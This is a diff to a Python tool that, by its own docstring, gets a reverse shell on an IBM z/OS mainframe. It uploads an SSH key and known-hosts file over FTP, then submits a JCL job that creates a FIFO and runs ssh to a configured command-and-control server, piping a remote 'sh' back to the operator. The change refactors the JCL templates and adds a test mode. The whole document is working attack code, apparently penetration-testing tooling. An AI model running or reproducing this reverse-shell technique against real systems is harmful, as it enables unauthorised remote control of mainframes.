@@ -1,4 +1,5 @@
 #!/usr/bin/python
+"""Gets a secure reverse shell on a mainframe by sending a JCL via FTP"""
 import sys
 import argparse
 from string import Template
@@ -7,24 +8,10 @@ import getpass
 from zosftp import ZOSFTP
 import ssh_utils
 from wrappingshell import WrappingShell
+from jcl import Job
 
-JCL_TEMPLATE = '''
-//FTPJOB JOB 1
-//RUN1   EXEC PGM=BPXBATCH
-//STDOUT DD SYSOUT=*
-//STDERR DD SYSOUT=*
-//STDIN  DD DUMMY
-//STDENV DD DUMMY
-//STDPARM DD *
-SH mkfifo $FIFONAME
-//RUN2   EXEC PGM=BPXBATCH
-//STDOUT DD SYSOUT=*
-//STDERR DD SYSOUT=*
-//STDIN  DD DUMMY
-//STDERR DD DUMMY
-//STDENV DD DUMMY
-//STDPARM DD *
-SH echo '
+MKFIFO = 'SH mkfifo $FIFONAME'
+REVERSE_SH_SSH_TO_FILE = '''SH echo '
 ssh -i $KEYNAME $CCU@$CCS -p $CCP
 -o UserKnownHostsFile=$KNOWNHOSTSFILE
 -o StrictHostKeyChecking=yes
@@ -34,26 +21,10 @@ ssh -i $KEYNAME $CCU@$CCS -p $CCP
 sh -s > $FIFONAME 2>&1
 & echo $STARTSEND 
 > $FIFONAME
-' > dev/test.txt
+' > $TESTPATH
 '''
 
-JCL_TEMPLATE = '''
-//FTPJOB JOB 1
-//RUN1   EXEC PGM=BPXBATCH
-//STDOUT DD SYSOUT=*
-//STDERR DD SYSOUT=*
-//STDIN  DD DUMMY
-//STDENV DD DUMMY
-//STDPARM DD *
-SH mkfifo $FIFONAME
-//RUN2   EXEC PGM=BPXBATCH
-//STDOUT DD SYSOUT=*
-//STDERR DD SYSOUT=*
-//STDIN  DD DUMMY
-//STDERR DD DUMMY
-//STDENV DD DUMMY
-//STDPARM DD *
-SH ssh -i $KEYNAME $CCU@$CCS -p $CCP
+REVERSE_SH_SSH = '''SH ssh -i $KEYNAME $CCU@$CCS -p $CCP
 -o UserKnownHostsFile=$KNOWNHOSTSFILE
 -o StrictHostKeyChecking=yes
 -N
@@ -70,6 +41,8 @@ def parse_configuration():
         description='Get a secure reverse shell via z/OS FTP')
     parser.add_argument('config_file', type=str,
                         help='configuration file to use')
+    parser.add_argument('-t', '--test', help='run in test mode (do not run the shell)',
+                        default=False, action='store_true')
     parser.add_argument('-p', '--privacy', help='hide the username on the password promt',
                         default=False, action='store_true')
     parser.add_argument('-s', '--savestate', type=str,
@@ -148,23 +121,37 @@ if __name__ == '__main__':
     # Save the known host file
     ftp.upload_string_as_file(cc_server_fingerprint, ftpknownhosts)
 
+    # Create the FIFO for the shell
+    mkfifo_step = Template(MKFIFO).substitute(FIFONAME=ftpfifoname)
+
     # Run the JCL to start the SSH tunnel
-    jcl = Template(JCL_TEMPLATE).substitute(FIFONAME=ftpfifoname,
-                                            KEYNAME=ftpkeyname,
-                                            KNOWNHOSTSFILE=ftpknownhosts,
-                                            CCU=config['cc_user'],
-                                            CCS=config['cc_server'],
-                                            CCP=config['cc_port'],
-                                            NCIP=config['ebcdiccat_host'],
-                                            NCP=config['ebcdiccat_port'],
-                                            STARTSEND=WrappingShell.TERMINATOR_STRING)
-    ftp.run_jcl(jcl)
+    if args.test:
+        ssh_command = REVERSE_SH_SSH_TO_FILE
+    else:
+        ssh_command = REVERSE_SH_SSH
+    ssh_step = Template(ssh_command).substitute(FIFONAME=ftpfifoname,
+                                                KEYNAME=ftpkeyname,
+                                                KNOWNHOSTSFILE=ftpknownhosts,
+                                                CCU=config['cc_user'],
+                                                CCS=config['cc_server'],
+                                                CCP=config['cc_port'],
+                                                NCIP=config['ebcdiccat_host'],
+                                                NCP=config['ebcdiccat_port'],
+                                                STARTSEND=WrappingShell.TERMINATOR_STRING,
+                                                TESTPATH=config['temporary_path']+'/testfile.txt')
+    JCL = Job('FTPJOB')
+    JCL.add_inline(mkfifo_step)
+    JCL.add_inline(ssh_step)
+    ftp.run_jcl(JCL.render())
 
     # Prepare the reverse shell handling
-    command = config['shell_command'].split(' ')
-    shell = WrappingShell(command, config['codepage'],
-                          name=config['hostname'], sync_stdout=True)
-    shell.cmdloop()
+    if args.test:
+        print('Skipping the shell activation, test mode on')
+    else:
+        command = config['shell_command'].split(' ')
+        shell = WrappingShell(command, config['codepage'],
+                              name=config['hostname'], sync_stdout=True)
+        shell.cmdloop()
 
     ftp.close()
 
@@ -179,4 +166,3 @@ if __name__ == '__main__':
 
         with open(args.savestate, 'w') as configfile:
             global_config.write(configfile)
-
